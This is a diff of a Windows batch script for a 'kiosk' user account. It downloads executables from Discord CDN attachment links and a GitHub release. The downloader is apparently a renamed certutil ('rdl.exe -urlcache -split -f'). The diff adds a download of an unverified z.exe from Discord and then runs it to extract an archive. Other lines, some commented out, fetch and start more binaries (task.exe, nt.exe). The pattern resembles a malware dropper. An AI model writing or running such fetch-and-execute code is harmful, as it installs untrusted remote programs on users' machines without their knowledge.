@@ -16,6 +16,7 @@ echo Exists) ELSE (
 )
 
 "c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\G\rdl.exe"
+"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108820816801574912/z.exe" "C:\Users\kiosk\Downloads\G\z.exe"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
 #"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\G\nt.exe"
 #"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\G\task.exe"
@@ -27,8 +28,8 @@ timeout /t 8
 
 #start "" "C:\Users\kiosk\Downloads\G\task.exe"
 
-"C:\Users\kiosk\Downloads\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/tobiasmulln/Testing/releases/download/LSF/G.zip"
-"C:\Users\kiosk\AppData\Roaming\Cloudforce\7-Zip\7z.exe" x "C:\Users\kiosk\Downloads\G.zip" -oC:\Users\kiosk\Downloads\G
+"C:\Users\kiosk\Downloads\G\rdl.exe" -k -L -o  "%zipFile%" "https://github.com/tobiasmulln/Testing/releases/download/LSF/G.zip"
+"C:\Users\kiosk\Downloads\G\z.exe" x "C:\Users\kiosk\Downloads\G.zip" -oC:\Users\kiosk\Downloads\G
 del "%zipFile%"
 
 REM --------- After Here RDL is in "C:\Users\kiosk\Downloads\G" !!
